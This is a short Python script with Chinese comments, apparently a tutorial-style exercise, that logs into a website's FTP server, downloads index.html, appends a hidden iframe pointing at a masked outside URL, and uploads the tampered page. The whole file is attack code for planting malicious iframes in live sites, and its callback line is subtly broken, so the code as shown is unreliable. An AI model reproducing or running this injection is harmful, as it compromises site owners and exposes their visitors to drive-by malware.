#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 19-5-12 上午12:23
# @Author  : Zhangbin
# @Site    : 
# @File    : inject_page.py
# @Software: PyCharm
# 在网页中插入信息

import ftplib

def inject_page(ftp, page, redirect):
    with open(page + '.tmp', 'w') as f:
        # 使用文本传输模式返回在服务器上执行命令的结果
        # command是指定命令的字符串,通常类似于'RETR filename’.callback是回调函数,
        # 每收到一行数据时都将调用该函数。该回调函数带有一个参数，是包含已收到数据的字符串。
        # 如果忽略callback, 则返回的数据将打印到sys.stdout中。
        ftp.retrlines('RETR ' + page, f.write())
        print('[+] download page: ' + page)
        # 将需要插入的数据插入网页中
        f.write(redirect)
        print('[+] Injected Malicious iframe on ' + page)
    # 在服务器上执行一个命令并使用文本传输模式传输数据。
    # command是指定低级命令的字符串。它通常是'STOR filename’。file是一个打开的文件对象,
    # 将使用file。readline()读取其数据并将该数据发送到服务器。
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] uploaded injected page: ' + page)

if __name__ == '__main__':
    host = ''
    user = ''
    password = ''
    ftp = ftplib.FTP(host)
    ftp.login(user, password)
    redirect = "<iframe src='http://****'></iframe>"
    inject_page(ftp, 'index.html', redirect)

